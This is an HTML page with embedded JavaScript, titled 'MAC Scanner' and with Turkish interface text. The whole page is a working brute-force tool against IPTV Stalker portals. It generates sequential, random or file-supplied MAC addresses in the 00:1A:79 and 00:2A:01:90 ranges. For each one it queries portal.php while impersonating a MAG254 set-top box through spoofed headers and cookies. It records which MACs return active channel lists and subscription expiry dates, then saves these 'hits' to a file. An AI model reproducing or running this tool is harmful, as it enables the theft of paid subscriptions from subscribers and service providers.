<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAC Scanner</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            max-width: 800px;
            width: 100%;
            color: #333;
        }
        h2 {
            font-weight: 700;
            color: #1e3c72;
            text-align: center;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }
        .info-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 10px;
            margin-top: 15px;
            font-size: 1rem;
            font-weight: 500;
        }
        #activeHits {
            max-height: 300px;
            overflow-y: auto;
            background: #e9ecef;
            border-radius: 10px;
            padding: 10px;
            margin-top: 15px;
        }
        #activeHits p {
            margin: 5px 0;
            font-size: 0.9rem;
        }
        .copy-all-btn {
            padding: 5px 10px;
            font-size: 0.9rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            display: block;
            text-align: center;
            width: 80px;
        }
        .copy-all-btn:hover {
            background-color: #0056b3;
        }
        .spinner {
            display: none;
            margin: 15px auto;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 0.9rem;
        }
        .mac-input {
            width: 20px;
            height: 30px;
            display: inline-block;
            margin: 0 1px;
            text-transform: uppercase;
            text-align: center;
            font-size: 0.8rem;
            padding: 0;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .mac-input:invalid {
            border-color: red;
        }
        button {
            padding: 5px 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            font-size: 0.9rem;
            width: 80px;
        }
        button:hover {
            background-color: #218838;
        }
        .modal-content {
            background: #fff;
            border-radius: 10px;
        }
        .modal-header {
            background: #1e3c72;
            color: #fff;
        }
        .modal-body button {
            width: 100%;
            margin: 5px 0;
            font-size: 0.9rem;
            padding: 5px;
        }
        .form-row {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .mac-input-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1px;
            margin-top: 10px;
        }
        .mac-input-row span {
            font-size: 0.8rem;
            color: #333;
            margin: 0 1px;
        }
        @media (max-width: 576px) {
            .container {
                padding: 15px;
            }
            h2 {
                font-size: 1.3rem;
            }
            .form-row, .mac-input-row {
                flex-direction: row;
                align-items: center;
            }
            .mac-input {
                width: 25px;
                height: 35px;
            }
            .mac-input-row span {
                font-size: 0.9rem;
            }
            button {
                width: 90px;
            }
            .copy-all-btn {
                width: 90px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>MAC Scanner</h2>
        <form id="scanForm">
            <input type="text" name="panel_url" id="panelUrl" placeholder="Enter Panel URL (e.g., http://merhaba.me:18000/)" required>
            <div class="form-row">
                <button type="button" data-bs-toggle="modal" data-bs-target="#comboModal" class="mt-2">Select Combo</button>
                <button type="submit" id="scanBtn" class="mt-2">Tara</button>
                <button type="button" id="stopBtn" class="mt-2" style="display: none;">Durdur</button>
            </div>
            <div class="mac-input-row">
                <input type="text" name="mac[0]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
                <span>:</span>
                <input type="text" name="mac[1]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
                <span>:</span>
                <input type="text" name="mac[2]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
                <span>:</span>
                <input type="text" name="mac[3]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
                <span>:</span>
                <input type="text" name="mac[4]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
                <span>:</span>
                <input type="text" name="mac[5]" class="mac-input" maxlength="2" placeholder="XX" pattern="[0-9A-Fa-f]{2}">
            </div>
            <input type="file" name="combo_file" id="comboFile" accept=".txt" style="margin-top: 10px;">
            <input type="hidden" name="combo_type" id="comboType" value="">
            <div class="info-box" id="selectedCombo">Selected Combo: None</div>
        </form>
        <div class="info-box" id="currentMac">Current MAC: -</div>
        <div class="info-box">
            <span id="hitCount">Active Hits: 0</span> | 
            <span id="scannedCount">Scanned MACs: 0</span>
        </div>
        <div class="spinner-border text-primary spinner" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
        <div id="activeHits">No active hits found.</div>
        <button id="copyAllBtn" class="copy-all-btn" style="display: none;" onclick="copyAllHits()">Copy All</button>
    </div>

    <!-- Combo Selection Modal -->
    <div class="modal fade" id="comboModal" tabindex="-1" aria-labelledby="comboModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="comboModalLabel">Select Combo Type</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:1A:79')">Sequential 00:1A:79</button>
                    <button type="button" class="btn btn-primary" onclick="selectCombo('sequential_00:2A:01:90')">Sequential 00:2A:01:90</button>
                    <button type="button" class="btn btn-primary" onclick="selectCombo('random_mixed')">Random Mixed</button>
                    <button type="button" class="btn btn-primary" onclick="selectCombo('custom_file')">Custom Combo File</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let isScanning = false;
        let stopScanning = false;
        let hitCount = 0;
        let scannedCount = 0;
        let activeHits = [];
        let counter = 0;
        let customMacs = [];
        const MAC_PATTERN = /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/;
        const HEX_CHARS = '0123456789ABCDEF'.split('');
        const BATCH_SIZE = 300;
        const hitFileContent = [];

        function updateCurrentMac(mac) {
            document.getElementById('currentMac').innerText = 'Current MAC: ' + mac;
        }
        function updateHitCount(count) {
            document.getElementById('hitCount').innerText = 'Active Hits: ' + count;
        }
        function updateScannedCount(count) {
            document.getElementById('scannedCount').innerText = 'Scanned MACs: ' + count;
        }
        function updateActiveHits(hits) {
            document.getElementById('activeHits').innerHTML = hits.length > 0 
                ? hits.join('') 
                : 'No active hits found.';
            document.getElementById('copyAllBtn').style.display = hits.length > 0 ? 'block' : 'none';
        }
        function copyAllHits() {
            const hits = Array.from(document.querySelectorAll('#activeHits p')).map(p => p.innerText);
            const panelUrl = document.getElementById('panelUrl').value.replace(/\/+$/, '');
            const copyText = hits.join('\n') + '\n' + Array.from(document.querySelectorAll('#activeHits p')).map(p => {
                const mac = p.innerText.split(' | ')[0].replace('MAC: ', '');
                return `URL: ${panelUrl}/portal.php?action=get_all_channels&type=itv&mac=${mac}`;
            }).join('\n');
            navigator.clipboard.writeText(copyText).then(() => {
                alert('All hits copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }
        function showSpinner(show) {
            document.querySelector('.spinner').style.display = show ? 'block' : 'none';
        }
        function selectCombo(combo) {
            document.getElementById('comboType').value = combo;
            let comboText = '';
            if (combo === 'sequential_00:1A:79') comboText = 'Sequential 00:1A:79';
            else if (combo === 'sequential_00:2A:01:90') comboText = 'Sequential 00:2A:01:90';
            else if (combo === 'random_mixed') comboText = 'Random Mixed';
            else if (combo === 'custom_file') comboText = 'Custom Combo File';
            document.getElementById('selectedCombo').innerText = 'Selected Combo: ' + comboText;
            document.getElementById('comboModal').querySelector('.btn-close').click();
        }

        function generateSequentialMac(prefix, counter) {
            let macs = [];
            let suffix;
            if (prefix === '00:1A:79') {
                suffix = counter.toString(16).padStart(6, '0').toUpperCase();
                suffix = suffix.substring(0, 2) + ':' + suffix.substring(2, 4) + ':' + suffix.substring(4, 6);
            } else {
                suffix = counter.toString(16).padStart(4, '0').toUpperCase();
                suffix = suffix.substring(0, 2) + ':' + suffix.substring(2, 4);
            }
            macs.push(prefix + ':' + suffix);
            return macs;
        }

        function generateRandomMac(prefixes) {
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            let suffix = '';
            if (prefix === '00:1A:79') {
                for (let i = 0; i < 3; i++) {
                    suffix += HEX_CHARS[Math.floor(Math.random() * 16)] + HEX_CHARS[Math.floor(Math.random() * 16)];
                    if (i < 2) suffix += ':';
                }
            } else {
                for (let i = 0; i < 2; i++) {
                    suffix += HEX_CHARS[Math.floor(Math.random() * 16)] + HEX_CHARS[Math.floor(Math.random() * 16)];
                    if (i < 1) suffix += ':';
                }
            }
            return prefix + ':' + suffix;
        }

        function generateSequentialMacFromPartial(baseMac, counter) {
            let macs = [];
            const variableCount = 6 - baseMac.filter(b => b !== '00' && b.match(/^[0-9A-Fa-f]{2}$/)).length;
            if (variableCount <= 0) return macs;
            const suffix = counter.toString(16).padStart(variableCount * 2, '0').toUpperCase();
            const suffixParts = suffix.match(/.{1,2}/g) || [];
            let currentMac = [...baseMac];
            let variableIndex = 0;
            for (let i = 0; i < 6; i++) {
                if (currentMac[i] === '00' || !currentMac[i]) {
                    currentMac[i] = suffixParts[variableIndex] || '00';
                    variableIndex++;
                }
            }
            const formattedMac = currentMac.join(':');
            if (MAC_PATTERN.test(formattedMac)) {
                macs.push(formattedMac);
            }
            return macs;
        }

        function formatDate(dateStr) {
            if (!dateStr || dateStr.toLowerCase().startsWith('un')) {
                return 'Unlimited (Unlimited Days)';
            }
            try {
                const parts = dateStr.replace(',', '').split(' ');
                if (parts.length < 3) return dateStr;
                const day = parseInt(parts[0]);
                const monthStr = parts[1].substring(0, 3).toLowerCase();
                const year = parseInt(parts[2]);
                const months = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 'aug', 'sep', 'oct', 'nov', 'dec'];
                const month = months.indexOf(monthStr) + 1;
                if (month === 0) return dateStr;

                const date = new Date(year, month - 1, day);
                const now = new Date();
                const diffTime = date - now;
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                return date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) + ` (${diffDays} Days)`;
            } catch (e) {
                return dateStr || 'Unknown';
            }
        }

        async function readComboFile(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const text = e.target.result;
                    if (!text.trim()) {
                        reject('Combo dosyası boş!');
                        return;
                    }
                    const macs = text.split('\n').map(line => line.trim().toUpperCase()).filter(mac => MAC_PATTERN.test(mac));
                    if (macs.length === 0) {
                        reject('Dosyada geçerli MAC adresi bulunamadı!');
                    } else {
                        resolve(macs);
                    }
                };
                reader.onerror = function() {
                    reject('Combo dosyası okunurken hata oluştu!');
                };
                reader.readAsText(file);
            });
        }

        async function scanMacs(panelUrl, comboType, macBytes, comboFile) {
            const cleanPanelUrl = panelUrl.replace(/\/+$/, '');
            let maxCounter;
            hitCount = 0;
            scannedCount = 0;
            activeHits = [];
            counter = 0;
            customMacs = [];
            hitFileContent.length = 0;
            updateHitCount(0);
            updateScannedCount(0);
            updateActiveHits([]);

            if (comboType === 'custom_file') {
                if (!comboFile) {
                    alert('Lütfen bir combo dosyası seçin!');
                    showSpinner(false);
                    isScanning = false;
                    return;
                }
                try {
                    customMacs = await readComboFile(comboFile);
                    maxCounter = customMacs.length - 1;
                } catch (e) {
                    alert(e);
                    showSpinner(false);
                    isScanning = false;
                    return;
                }
            } else if (comboType) {
                maxCounter = comboType === 'sequential_00:1A:79' ? 16777215 : (comboType === 'sequential_00:2A:01:90' ? 65535 : Infinity);
            } else {
                const filledCount = macBytes.filter(b => b !== '00' && b.match(/^[0-9A-Fa-f]{2}$/)).length;
                if (filledCount === 6) {
                    alert('Tüm MAC baytları dolu, tarama yapılamaz!');
                    showSpinner(false);
                    isScanning = false;
                    return;
                }
                if (filledCount === 0) {
                    alert('Lütfen en az 1 MAC baytı doldurun!');
                    showSpinner(false);
                    isScanning = false;
                    return;
                }
                maxCounter = Math.pow(256, 6 - filledCount) - 1;
            }

            while (counter <= maxCounter && !stopScanning) {
                let batchMacs = [];
                let macsPerBatch = 0;

                if (comboType === 'custom_file') {
                    const start = counter;
                    const end = Math.min(counter + BATCH_SIZE, customMacs.length);
                    batchMacs = customMacs.slice(start, end);
                    counter = end;
                } else if (comboType === 'sequential_00:1A:79' || comboType === 'sequential_00:2A:01:90') {
                    const prefix = comboType === 'sequential_00:1A:79' ? '00:1A:79' : '00:2A:01:90';
                    while (macsPerBatch < BATCH_SIZE && counter <= maxCounter) {
                        const macs = generateSequentialMac(prefix, counter);
                        for (let mac of macs) {
                            if (macsPerBatch >= BATCH_SIZE) break;
                            if (MAC_PATTERN.test(mac)) {
                                batchMacs.push(mac);
                                macsPerBatch++;
                            }
                        }
                        counter++;
                    }
                } else if (comboType === 'random_mixed') {
                    for (let i = 0; i < BATCH_SIZE; i++) {
                        const mac = generateRandomMac(['00:1A:79', '00:2A:01:90']);
                        if (MAC_PATTERN.test(mac)) {
                            batchMacs.push(mac);
                        }
                    }
                } else {
                    while (macsPerBatch < BATCH_SIZE && counter <= maxCounter) {
                        const macs = generateSequentialMacFromPartial(macBytes, counter);
                        for (let mac of macs) {
                            if (macsPerBatch >= BATCH_SIZE) break;
                            if (MAC_PATTERN.test(mac)) {
                                batchMacs.push(mac);
                                macsPerBatch++;
                            }
                        }
                        counter++;
                    }
                }

                const fetchPromises = batchMacs.map(async mac => {
                    if (stopScanning) return null;
                    scannedCount++;
                    updateCurrentMac(mac);
                    updateScannedCount(scannedCount);
                    const url = `${cleanPanelUrl}/portal.php?action=get_all_channels&type=itv&mac=${mac}`;
                    const accountUrl = `${cleanPanelUrl}/portal.php?type=account_info&action=get_main_info&mac=${mac}&JsHttpRequest=1-xml`;

                    try {
                        const response = await fetch(url, {
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
                                'Cookie': `mac=${mac}; stb_lang=en; timezone=Europe/Paris;`,
                                'X-User-Agent': 'Model: MAG254; Link: Ethernet'
                            },
                            signal: AbortSignal.timeout(5000)
                        });
                        if (!response.ok) {
                            console.log(`Request failed for MAC ${mac}: Status ${response.status}`);
                            return null;
                        }

                        const text = await response.text();
                        let data;
                        try {
                            data = JSON.parse(text);
                        } catch (e) {
                            console.log(`Invalid JSON for MAC ${mac}: ${text.substring(0, 100)}...`);
                            return null;
                        }

                        if (data && Object.keys(data).length > 0 && data.js && Array.isArray(data.js) && data.js.length > 0) {
                            const accountResponse = await fetch(accountUrl, {
                                headers: {
                                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
                                    'Cookie': `mac=${mac}; stb_lang=en; timezone=Europe/Paris;`,
                                    'X-User-Agent': 'Model: MAG254; Link: Ethernet'
                                },
                                signal: AbortSignal.timeout(5000)
                            });
                            let expiryDate = 'Unknown';
                            if (accountResponse.ok) {
                                const accountText = await accountResponse.text();
                                try {
                                    const accountData = JSON.parse(accountText);
                                    if (accountData.js && accountData.js.end_date) {
                                        expiryDate = accountData.js.end_date;
                                    } else if (accountData.js && accountData.js.phone) {
                                        expiryDate = accountData.js.phone;
                                    }
                                } catch (e) {
                                    if (accountText.includes('end_date":"')) {
                                        expiryDate = accountText.split('end_date":"')[1].split('"')[0];
                                    } else if (accountText.includes('phone":"')) {
                                        expiryDate = accountText.split('phone":"')[1].split('"')[0];
                                    }
                                }
                                expiryDate = formatDate(expiryDate);
                            } else {
                                console.log(`Account info failed for MAC ${mac}: Status ${accountResponse.status}`);
                            }
                            hitCount++;
                            const hitText = `MAC: ${mac} | Exp: ${expiryDate}`;
                            activeHits.push(`<p>${hitText}</p>`);
                            hitFileContent.push(`MAC: ${mac}\nURL: ${url}\nExp: ${expiryDate}\n\n`);
                            return { hit: true, hitText, url };
                        }
                        return null;
                    } catch (e) {
                        console.log(`Error fetching MAC ${mac}: ${e.message}`);
                        return null;
                    }
                });

                const results = await Promise.all(fetchPromises);
                results.forEach(result => {
                    if (result && result.hit) {
                        updateHitCount(hitCount);
                        updateActiveHits(activeHits);
                        saveToFile();
                    }
                });

                await new Promise(resolve => setTimeout(resolve, 100));
            }
            saveToFile();
            showSpinner(false);
            isScanning = false;
            document.getElementById('scanBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
        }

        function saveToFile() {
            if (hitFileContent.length > 0) {
                const blob = new Blob([hitFileContent.join('')], { type: 'text/plain' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'hitts.txt';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                hitFileContent.length = 0;
            }
        }

        document.getElementById('scanForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            if (isScanning) {
                alert('Tarama zaten devam ediyor!');
                return;
            }

            const formData = new FormData(this);
            const panelUrl = formData.get('panel_url');
            const comboType = formData.get('combo_type');
            const comboFile = formData.get('combo_file');
            const mac = [
                formData.get('mac[0]') || '00',
                formData.get('mac[1]') || '00',
                formData.get('mac[2]') || '00',
                formData.get('mac[3]') || '00',
                formData.get('mac[4]') || '00',
                formData.get('mac[5]') || '00'
            ].map(s => s.toUpperCase());

            // Validation logic
            const isMacFilled = mac.some(byte => byte !== '00' && byte.match(/^[0-9A-Fa-f]{2}$/));
            const isMacFullyFilled = mac.every(byte => byte !== '00' && byte.match(/^[0-9A-Fa-f]{2}$/));

            if (comboType === 'custom_file' && !comboFile) {
                alert('Lütfen bir combo dosyası seçin!');
                return;
            }
            if (!comboType && !comboFile && !isMacFilled) {
                alert('Lütfen bir combo tipi seçin, en az bir MAC baytı doldurun veya bir combo dosyası yükleyin!');
                return;
            }
            if (!comboType && !comboFile && isMacFullyFilled) {
                alert('Tüm MAC baytları dolu, tarama yapılamaz!');
                return;
            }

            isScanning = true;
            stopScanning = false;
            document.getElementById('scanBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            showSpinner(true);
            scanMacs(panelUrl, comboType, mac, comboFile);
        });

        document.getElementById('stopBtn').addEventListener('click', function() {
            stopScanning = true;
            isScanning = false;
            showSpinner(false);
            document.getElementById('scanBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            saveToFile();
        });
    </script>
</body>
</html>